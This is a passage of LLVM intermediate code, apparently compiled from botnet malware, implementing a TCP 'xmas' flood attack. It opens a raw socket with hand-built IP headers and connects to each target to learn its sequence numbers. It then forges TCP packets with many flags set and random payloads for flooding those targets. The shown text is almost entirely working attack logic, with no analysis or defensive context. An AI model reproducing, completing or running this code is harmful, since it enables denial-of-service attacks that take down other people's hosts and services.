  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 noundef %45, i64 noundef 16) #8
  %47 = bitcast i8* %46 to %struct.attack_xmas_data*
  store %struct.attack_xmas_data* %47, %struct.attack_xmas_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 noundef %49, i64 noundef 8) #8
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 noundef zeroext %52, %struct.attack_option* noundef %53, i8 noundef zeroext 2, i32 noundef 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 noundef zeroext %56, %struct.attack_option* noundef %57, i8 noundef zeroext 3, i32 noundef 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 noundef zeroext %60, %struct.attack_option* noundef %61, i8 noundef zeroext 4, i32 noundef 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 noundef zeroext %64, %struct.attack_option* noundef %65, i8 noundef zeroext 5, i32 noundef 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 noundef zeroext %68, %struct.attack_option* noundef %69, i8 noundef zeroext 7, i32 noundef 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 noundef zeroext %72, %struct.attack_option* noundef %73, i8 noundef zeroext 11, i32 noundef 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 noundef zeroext %76, %struct.attack_option* noundef %77, i8 noundef zeroext 12, i32 noundef 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 noundef zeroext %80, %struct.attack_option* noundef %81, i8 noundef zeroext 13, i32 noundef 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 noundef zeroext %84, %struct.attack_option* noundef %85, i8 noundef zeroext 14, i32 noundef 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 noundef zeroext %88, %struct.attack_option* noundef %89, i8 noundef zeroext 15, i32 noundef 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 noundef zeroext %92, %struct.attack_option* noundef %93, i8 noundef zeroext 16, i32 noundef 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 noundef zeroext %96, %struct.attack_option* noundef %97, i8 noundef zeroext 0, i32 noundef 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 noundef zeroext %99, %struct.attack_option* noundef %100, i8 noundef zeroext 1, i32 noundef 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #8
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

105:                                              ; preds = %4
  br label %606

106:                                              ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 noundef %107, i32 noundef 0, i32 noundef 3, i8* noundef %108, i32 noundef 4) #8
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

111:                                              ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 noundef %112)
  br label %606

114:                                              ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

115:                                              ; preds = %491, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %494

120:                                              ; preds = %115
  br label %121

121:                                              ; preds = %486, %475, %120
  %122 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #8
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

124:                                              ; preds = %121
  br label %491

125:                                              ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 noundef %127, i32 noundef 3, i32 noundef 0)
  %129 = or i32 %128, 2048
  %130 = call i32 (i32, i32, ...) @fcntl(i32 noundef %126, i32 noundef 4, i32 noundef %129)
  %131 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %131, align 4
  %132 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 2
  %137 = load i8, i8* %136, align 4
  %138 = zext i8 %137 to i32
  %139 = icmp slt i32 %138, 32
  br i1 %139, label %140, label %161

140:                                              ; preds = %125
  %141 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %142 = load i32, i32* %9, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %141, i64 %143
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i32 0, i32 1
  %146 = load i32, i32* %145, align 4
  %147 = call i32 @ntohl(i32 noundef %146) #9
  %148 = call i32 @rand_next()
  %149 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %150 = load i32, i32* %9, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 2
  %154 = load i8, i8* %153, align 4
  %155 = zext i8 %154 to i32
  %156 = lshr i32 %148, %155
  %157 = add i32 %147, %156
  %158 = call i32 @htonl(i32 noundef %157) #9
  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %160 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %159, i32 0, i32 0
  store i32 %158, i32* %160, align 4
  br label %170

161:                                              ; preds = %125
  %162 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %163 = load i32, i32* %9, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 1
  %167 = load i32, i32* %166, align 4
  %168 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %169 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %168, i32 0, i32 0
  store i32 %167, i32* %169, align 4
  br label %170

170:                                              ; preds = %161, %140
  %171 = load i16, i16* %17, align 2
  %172 = zext i16 %171 to i32
  %173 = icmp eq i32 %172, 65535
  br i1 %173, label %174, label %179

174:                                              ; preds = %170
  %175 = call i32 @rand_next()
  %176 = and i32 %175, 65535
  %177 = trunc i32 %176 to i16
  %178 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %177, i16* %178, align 2
  br label %183

179:                                              ; preds = %170
  %180 = load i16, i16* %17, align 2
  %181 = call zeroext i16 @htons(i16 noundef zeroext %180) #9
  %182 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %181, i16* %182, align 2
  br label %183

183:                                              ; preds = %179, %174
  %184 = load i32, i32* %26, align 4
  %185 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %186 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %186, %struct.sockaddr** %185, align 8
  %187 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %188 = load %struct.sockaddr*, %struct.sockaddr** %187, align 8
  %189 = call i32 @connect(i32 noundef %184, %struct.sockaddr* %188, i32 noundef 16)
  %190 = call i64 @time(i64* noundef null) #8
  store i64 %190, i64* %31, align 8
  br label %191

191:                                              ; preds = %489, %183
  store i32 16, i32* %29, align 4
  %192 = load i32, i32* %10, align 4
  %193 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i64 0, i64 0
  %194 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %195 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %195, %struct.sockaddr** %194, align 8
  %196 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %197 = load %struct.sockaddr*, %struct.sockaddr** %196, align 8
  %198 = call i64 @recvfrom(i32 noundef %192, i8* noundef %193, i64 noundef 256, i32 noundef 16384, %struct.sockaddr* %197, i32* noundef %29)
  %199 = trunc i64 %198 to i32
  store i32 %199, i32* %33, align 4
  %200 = load i32, i32* %33, align 4
  %201 = icmp eq i32 %200, -1
  br i1 %201, label %202, label %203

202:                                              ; preds = %191
  br label %606

203:                                              ; preds = %191
  %204 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %205 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 4
  %207 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %208 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %207, i32 0, i32 0
  %209 = load i32, i32* %208, align 4
  %210 = icmp eq i32 %206, %209
  br i1 %210, label %211, label %481

211:                                              ; preds = %203
  %212 = load i32, i32* %33, align 4
  %213 = sext i32 %212 to i64
  %214 = icmp ugt i64 %213, 40
  br i1 %214, label %215, label %481

215:                                              ; preds = %211
  %216 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i64 0, i64 0
  %217 = getelementptr inbounds i8, i8* %216, i64 20
  %218 = bitcast i8* %217 to %struct.tcphdr*
  store %struct.tcphdr* %218, %struct.tcphdr** %35, align 8
  %219 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %220 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %219, i32 0, i32 0
  %221 = load i16, i16* %220, align 4
  %222 = zext i16 %221 to i32
  %223 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %224 = load i16, i16* %223, align 2
  %225 = zext i16 %224 to i32
  %226 = icmp eq i32 %222, %225
  br i1 %226, label %227, label %480

227:                                              ; preds = %215
  %228 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = lshr i16 %230, 9
  %232 = and i16 %231, 1
  %233 = zext i16 %232 to i32
  %234 = icmp ne i32 %233, 0
  br i1 %234, label %235, label %459

235:                                              ; preds = %227
  %236 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = lshr i16 %238, 12
  %240 = and i16 %239, 1
  %241 = zext i16 %240 to i32
  %242 = icmp ne i32 %241, 0
  br i1 %242, label %243, label %459

243:                                              ; preds = %235
  %244 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %245 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %244, i32 0, i32 0
  %246 = load i32, i32* %245, align 4
  %247 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %248 = load i32, i32* %9, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %247, i64 %249
  %251 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %250, i32 0, i32 0
  store i32 %246, i32* %251, align 4
  %252 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 2
  %254 = load i32, i32* %253, align 4
  %255 = call i32 @ntohl(i32 noundef %254) #9
  %256 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %257 = load i32, i32* %9, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %256, i64 %258
  %260 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %259, i32 0, i32 1
  store i32 %255, i32* %260, align 4
  %261 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %262 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %261, i32 0, i32 3
  %263 = load i32, i32* %262, align 4
  %264 = call i32 @ntohl(i32 noundef %263) #9
  %265 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %266 = load i32, i32* %9, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %265, i64 %267
  %269 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %268, i32 0, i32 2
  store i32 %264, i32* %269, align 4
  %270 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %271 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %270, i32 0, i32 1
  %272 = load i16, i16* %271, align 2
  %273 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %274 = load i32, i32* %9, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %273, i64 %275
  %277 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %276, i32 0, i32 3
  store i16 %272, i16* %277, align 4
  %278 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %279 = load i16, i16* %278, align 2
  %280 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %281 = load i32, i32* %9, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %280, i64 %282
  %284 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %283, i32 0, i32 4
  store i16 %279, i16* %284, align 2
  %285 = load i32, i32* %24, align 4
  %286 = sext i32 %285 to i64
  %287 = add i64 40, %286
  %288 = call noalias i8* @malloc(i64 noundef %287) #8
  %289 = load i8**, i8*** %12, align 8
  %290 = load i32, i32* %9, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds i8*, i8** %289, i64 %291
  store i8* %288, i8** %292, align 8
  %293 = load i8**, i8*** %12, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds i8*, i8** %293, i64 %295
  %297 = load i8*, i8** %296, align 8
  %298 = bitcast i8* %297 to %struct.iphdr*
  store %struct.iphdr* %298, %struct.iphdr** %36, align 8
  %299 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %300 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %299, i64 1
  %301 = bitcast %struct.iphdr* %300 to %struct.tcphdr*
  store %struct.tcphdr* %301, %struct.tcphdr** %37, align 8
  %302 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i64 1
  %304 = bitcast %struct.tcphdr* %303 to i8*
  store i8* %304, i8** %38, align 8
  %305 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %306 = bitcast %struct.iphdr* %305 to i8*
  %307 = load i8, i8* %306, align 4
  %308 = and i8 %307, 15
  %309 = or i8 %308, 64
  store i8 %309, i8* %306, align 4
  %310 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %311 = bitcast %struct.iphdr* %310 to i8*
  %312 = load i8, i8* %311, align 4
  %313 = and i8 %312, -16
  %314 = or i8 %313, 5
  store i8 %314, i8* %311, align 4
  %315 = load i8, i8* %13, align 1
  %316 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %317 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %316, i32 0, i32 1
  store i8 %315, i8* %317, align 1
  %318 = load i32, i32* %24, align 4
  %319 = sext i32 %318 to i64
  %320 = add i64 40, %319
  %321 = trunc i64 %320 to i16
  %322 = call zeroext i16 @htons(i16 noundef zeroext %321) #9
  %323 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 2
  store i16 %322, i16* %324, align 2
  %325 = load i16, i16* %14, align 2
  %326 = call zeroext i16 @htons(i16 noundef zeroext %325) #9
  %327 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %328 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %327, i32 0, i32 3
  store i16 %326, i16* %328, align 4
  %329 = load i8, i8* %15, align 1
  %330 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 5
  store i8 %329, i8* %331, align 4
  %332 = load i8, i8* %16, align 1
  %333 = icmp ne i8 %332, 0
  br i1 %333, label %334, label %338

334:                                              ; preds = %243
  %335 = call zeroext i16 @htons(i16 noundef zeroext 16384) #9
  %336 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i32 0, i32 4
  store i16 %335, i16* %337, align 2
  br label %338

338:                                              ; preds = %334, %243
  %339 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 6
  store i8 6, i8* %340, align 1
  %341 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %342 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %341, i32 0, i32 8
  store i32 100, i32* %342, align 4
  %343 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %344 = load i32, i32* %9, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %343, i64 %345
  %347 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %346, i32 0, i32 0
  %348 = load i32, i32* %347, align 4
  %349 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %350 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %349, i32 0, i32 9
  store i32 %348, i32* %350, align 4
  %351 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %352 = load i32, i32* %9, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %351, i64 %353
  %355 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %354, i32 0, i32 3
  %356 = load i16, i16* %355, align 4
  %357 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %358 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %357, i32 0, i32 0
  store i16 %356, i16* %358, align 4
  %359 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %360 = load i32, i32* %9, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %359, i64 %361
  %363 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %362, i32 0, i32 4
  %364 = load i16, i16* %363, align 2
  %365 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %366 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %365, i32 0, i32 1
  store i16 %364, i16* %366, align 2
  %367 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %368 = load i32, i32* %9, align 4
  %369 = sext i32 %368 to i64
  %370 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %367, i64 %369
  %371 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %370, i32 0, i32 2
  %372 = load i32, i32* %371, align 4
  %373 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %374 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %373, i32 0, i32 2
  store i32 %372, i32* %374, align 4
  %375 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %376 = load i32, i32* %9, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %375, i64 %377
  %379 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %378, i32 0, i32 1
  %380 = load i32, i32* %379, align 4
  %381 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %382 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %381, i32 0, i32 3
  store i32 %380, i32* %382, align 4
  %383 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %384 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %383, i32 0, i32 4
  %385 = load i16, i16* %384, align 4
  %386 = and i16 %385, -241
  %387 = or i16 %386, 128
  store i16 %387, i16* %384, align 4
  %388 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 4
  %390 = load i16, i16* %389, align 4
  %391 = and i16 %390, -257
  %392 = or i16 %391, 256
  store i16 %392, i16* %389, align 4
  %393 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %394 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %393, i32 0, i32 4
  %395 = load i16, i16* %394, align 4
  %396 = and i16 %395, -4097
  %397 = or i16 %396, 4096
  store i16 %397, i16* %394, align 4
  %398 = call i32 @rand_next()
  %399 = and i32 %398, 65535
  %400 = trunc i32 %399 to i16
  %401 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %402 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %401, i32 0, i32 5
  store i16 %400, i16* %402, align 2
  %403 = load i8, i8* %18, align 1
  %404 = sext i8 %403 to i16
  %405 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %406 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %405, i32 0, i32 4
  %407 = load i16, i16* %406, align 4
  %408 = and i16 %404, 1
  %409 = shl i16 %408, 13
  %410 = and i16 %407, -8193
  %411 = or i16 %410, %409
  store i16 %411, i16* %406, align 4
  %412 = load i8, i8* %19, align 1
  %413 = sext i8 %412 to i16
  %414 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %415 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %414, i32 0, i32 4
  %416 = load i16, i16* %415, align 4
  %417 = and i16 %413, 1
  %418 = shl i16 %417, 12
  %419 = and i16 %416, -4097
  %420 = or i16 %419, %418
  store i16 %420, i16* %415, align 4
  %421 = load i8, i8* %20, align 1
  %422 = sext i8 %421 to i16
  %423 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 4
  %425 = load i16, i16* %424, align 4
  %426 = and i16 %422, 1
  %427 = shl i16 %426, 11
  %428 = and i16 %425, -2049
  %429 = or i16 %428, %427
  store i16 %429, i16* %424, align 4
  %430 = load i8, i8* %21, align 1
  %431 = sext i8 %430 to i16
  %432 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %433 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %432, i32 0, i32 4
  %434 = load i16, i16* %433, align 4
  %435 = and i16 %431, 1
  %436 = shl i16 %435, 10
  %437 = and i16 %434, -1025
  %438 = or i16 %437, %436
  store i16 %438, i16* %433, align 4
  %439 = load i8, i8* %22, align 1
  %440 = sext i8 %439 to i16
  %441 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %442 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %441, i32 0, i32 4
  %443 = load i16, i16* %442, align 4
  %444 = and i16 %440, 1
  %445 = shl i16 %444, 9
  %446 = and i16 %443, -513
  %447 = or i16 %446, %445
  store i16 %447, i16* %442, align 4
  %448 = load i8, i8* %23, align 1
  %449 = sext i8 %448 to i16
  %450 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %451 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %450, i32 0, i32 4
  %452 = load i16, i16* %451, align 4
  %453 = and i16 %449, 1
  %454 = shl i16 %453, 8
  %455 = and i16 %452, -257
  %456 = or i16 %455, %454
  store i16 %456, i16* %451, align 4
  %457 = load i8*, i8** %38, align 8
  %458 = load i32, i32* %24, align 4
  call void @rand_str(i8* noundef %457, i32 noundef %458)
  br label %490

459:                                              ; preds = %235, %227
  %460 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %461 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %460, i32 0, i32 4
  %462 = load i16, i16* %461, align 4
  %463 = lshr i16 %462, 8
  %464 = and i16 %463, 1
  %465 = zext i16 %464 to i32
  %466 = icmp ne i32 %465, 0
  br i1 %466, label %475, label %467

467:                                              ; preds = %459
  %468 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %469 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %468, i32 0, i32 4
  %470 = load i16, i16* %469, align 4
  %471 = lshr i16 %470, 10
  %472 = and i16 %471, 1
  %473 = zext i16 %472 to i32
  %474 = icmp ne i32 %473, 0
  br i1 %474, label %475, label %478

475:                                              ; preds = %467, %459
  %476 = load i32, i32* %26, align 4
  %477 = call i32 @close(i32 noundef %476)
  br label %121

478:                                              ; preds = %467
  br label %479

479:                                              ; preds = %478
  br label %480

480:                                              ; preds = %479, %215
  br label %481

481:                                              ; preds = %480, %211, %203
  %482 = call i64 @time(i64* noundef null) #8
  %483 = load i64, i64* %31, align 8
  %484 = sub nsw i64 %482, %483
  %485 = icmp sgt i64 %484, 10
  br i1 %485, label %486, label %489

486:                                              ; preds = %481
  %487 = load i32, i32* %26, align 4
  %488 = call i32 @close(i32 noundef %487)
  br label %121

489:                                              ; preds = %481
  br label %191

490:                                              ; preds = %338
  br label %491

491:                                              ; preds = %490, %124
  %492 = load i32, i32* %9, align 4
  %493 = add nsw i32 %492, 1
  store i32 %493, i32* %9, align 4
  br label %115, !llvm.loop !15

494:                                              ; preds = %115
  br label %495

495:                                              ; preds = %605, %494
  store i32 0, i32* %9, align 4
  br label %496

496:                                              ; preds = %602, %495
  %497 = load i32, i32* %9, align 4
  %498 = load i8, i8* %5, align 1
  %499 = zext i8 %498 to i32
  %500 = icmp slt i32 %497, %499
  br i1 %500, label %501, label %605

501:                                              ; preds = %496
  %502 = load i8**, i8*** %12, align 8
  %503 = load i32, i32* %9, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds i8*, i8** %502, i64 %504
  %506 = load i8*, i8** %505, align 8
  store i8* %506, i8** %39, align 8
  %507 = load i8*, i8** %39, align 8
  %508 = bitcast i8* %507 to %struct.iphdr*
